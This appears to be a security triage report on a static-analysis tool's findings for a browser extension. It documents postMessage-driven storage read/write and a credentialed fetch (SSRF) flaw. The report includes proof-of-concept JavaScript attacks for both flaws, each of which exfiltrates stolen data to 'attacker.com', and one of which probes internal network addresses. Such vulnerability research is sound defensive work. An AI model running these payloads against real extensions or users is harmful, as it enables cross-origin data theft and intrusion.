# CoCo Analysis: albfhllpljifkmplbcmmfppfcfdlpdcf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 5 (multiple distinct flows)

---

## Sink 1: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/albfhllpljifkmplbcmmfppfcfdlpdcf/opgen_generated_files/cs_0.js
Line 556	window.addEventListener("message", async function(event) {
Line 557	if(event.data.message === "set"){
Line 558	saveToLocalStorage(event.data.objPassed);

**Code:**

```javascript
// Content script - Entry point (cs_0.js line 556-559)
window.addEventListener("message", async function(event) {
  if(event.data.message === "set"){
    saveToLocalStorage(event.data.objPassed);  // ← attacker-controlled data
    window.postMessage({message: "Set Done"}, "*");
  }
  // ... other handlers
});

function saveToLocalStorage(obj) {
  chrome.storage.local.set(obj, function() {
    // ← attacker controls obj, can poison storage
  });
}
```

**Classification:** FALSE POSITIVE (for this specific sink)

**Reason:** This is storage poisoning without a complete exploitation chain. While the attacker can write arbitrary data to storage via window.postMessage, this sink alone doesn't show the retrieval path back to the attacker.

---

## Sink 2 & 3: storage_local_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/albfhllpljifkmplbcmmfppfcfdlpdcf/opgen_generated_files/cs_0.js
Line 418	var storage_local_get_source = { 'key': 'value' }; (CoCo framework code)

**Code:**

```javascript
// Content script - Message handlers (cs_0.js line 556-565)
window.addEventListener("message", async function(event) {
  // ... set handler
  if(event.data.message === "get"){
    var keys = event.data.keys;  // ← attacker controls keys
    getFromLocalStorage(keys, function(result) {
      window.postMessage({message: "getCompleted", result:result}, "*");
      // ← sends storage data back to attacker
    });
    return true;
  }
  // ... other handlers
});

function getFromLocalStorage(keys, callback) {
  chrome.storage.local.get(keys, function(result) {
    callback(result);  // ← storage data passed to callback
  });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (combined storage write + read)

**Attack:**

```javascript
// On www.ea.com/*/ultimate-team/web-app/* page (attacker-controlled webpage)
// Step 1: Poison storage
window.postMessage({
  message: "set",
  objPassed: {
    maliciousKey: "maliciousValue",
    userData: "stolen"
  }
}, "*");

// Step 2: Read back stored data
window.postMessage({
  message: "get",
  keys: null  // null retrieves all storage
}, "*");

// Step 3: Listen for response
window.addEventListener("message", function(event) {
  if (event.data.message === "getCompleted") {
    console.log("Stolen storage data:", event.data.result);
    // Exfiltrate to attacker server
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(event.data.result)
    });
  }
});
```

**Impact:** Complete storage exploitation chain - An attacker controlling a webpage matching www.ea.com can both poison the extension's storage and read back all stored data, including potentially sensitive user information, session data, or configuration.

---

## Sink 4: cs_window_eventListener_message → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/albfhllpljifkmplbcmmfppfcfdlpdcf/opgen_generated_files/cs_0.js
Line 556	window.addEventListener("message", async function(event) {
Line 571	sendMessloop("fetchPls", event.data.urlToFetch)

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/albfhllpljifkmplbcmmfppfcfdlpdcf/opgen_generated_files/bg.js
Line 1015	fetch(decodeURIComponent(message.que), {

**Code:**

```javascript
// Content script - Entry point (cs_0.js line 556-579)
window.addEventListener("message", async function(event) {
  // ... other handlers
  if(event.data.message === "fetchPls"){
    sendMessloop("fetchPls", event.data.urlToFetch)  // ← attacker-controlled URL
    .then(function(response) {
      window.postMessage({message: "fetchCompleted", res:response}, "*");
      // ← sends fetch response back to attacker
    })
    .catch(function(error) {
      console.log(error);
    });
  }
});

var sendMessloop = function(e, t) {
  return new Promise(function(resolve) {
    chrome.runtime.sendMessage({
      content: e,
      que: t  // ← forwards attacker URL to background
    }, function(a) {
      resolve(a);
    });
  });
};

// Background script - Message handler (bg.js line 1014-1030)
chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
  // ... other handlers
  if (message.content && message.content === "fetchPls"){
    fetch(decodeURIComponent(message.que), {  // ← attacker-controlled URL
      mode: 'cors',
      credentials: 'include',  // ← sends cookies with request!
    })
    .then(function(response) {
      return response.text();
    })
    .then(function(textContent) {
      sendResponse(textContent);  // ← returns response to attacker
    })
    .catch(function(error) {
      console.log(error);
    });
    return true;
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage leading to SSRF

**Attack:**

```javascript
// On www.ea.com/*/ultimate-team/web-app/* page
// SSRF to internal network
window.postMessage({
  message: "fetchPls",
  urlToFetch: "http://192.168.1.1/admin"
}, "*");

// Or exfiltrate data from other origins
window.postMessage({
  message: "fetchPls",
  urlToFetch: "https://victim-site.com/api/sensitive-data"
}, "*");

// Listen for response
window.addEventListener("message", function(event) {
  if (event.data.message === "fetchCompleted") {
    console.log("SSRF response:", event.data.res);
    // Exfiltrate to attacker
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: event.data.res
    });
  }
});
```

**Impact:** Server-Side Request Forgery (SSRF) with credential exposure - An attacker can make the extension perform arbitrary HTTP requests to any URL (including internal networks) with the user's credentials (`credentials: 'include'`), and receive the responses back. This allows reading sensitive data from other origins, accessing internal network resources, or performing authenticated actions on behalf of the user on any website.

---

## Overall Classification: TRUE POSITIVE

The extension has multiple exploitable vulnerabilities:
1. **Complete storage exploitation** (write + read chain)
2. **SSRF with credential exposure** allowing cross-origin data theft and internal network access

Both vulnerabilities are exploitable by any attacker who can control content on www.ea.com URLs where the extension runs.
